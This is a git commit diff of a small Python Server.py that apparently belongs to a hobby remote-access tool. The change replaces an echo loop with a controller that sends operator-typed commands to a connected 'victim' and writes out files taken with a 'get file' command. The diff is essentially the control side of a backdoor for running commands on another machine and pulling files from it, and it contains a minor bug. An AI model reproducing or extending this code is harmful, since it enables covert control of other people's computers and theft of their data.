c79b9982a6d484c4b6a9824ad5d9a6cc98e70cd1
yehonatan1 <54950358+yehonatan1@users.noreply.github.com>
2020-02-10 11:31:14 -0800

    Update Server.py

--- Server.py
+++ Server.py
@@ -3,19 +3,22 @@ import socket
 
 def server():
     s = socket.socket()
-    s.bind(('127.0.0.1', 9855))
+    s.bind(('127.0.0.1', 8965))
 
     s.listen(1)
-    client_socket, addr = s.accept()
-    print("Connection from: " + str(addr))
+    client_socket, adress = s.accept()
+    print("Connection from: " + str(adress))
+    while True:
+        command = input('Please enter a command to the victim')
+        client_socket.send(command.encode('utf-8'))
+        data = client_socket.recv(1024).decode('utf-8')
+        if 'get file ' in command:
+            command = command.replace('get file ', '')
+            with open(command, 'wb')as file:
+                file.writelines(data)
 
-    message = input('-> ')
-    while message != 'q':
-        s.send(message.encode('utf-8'))
-        data = s.recv(1024).decode('utf-8')
-        print('Received from server: ' + data)
-        message = input('==> ')
-    s.close()
+        print('From victim: ' + data)
+    client_socket.close()
 
 
 if __name__ == '__main__':
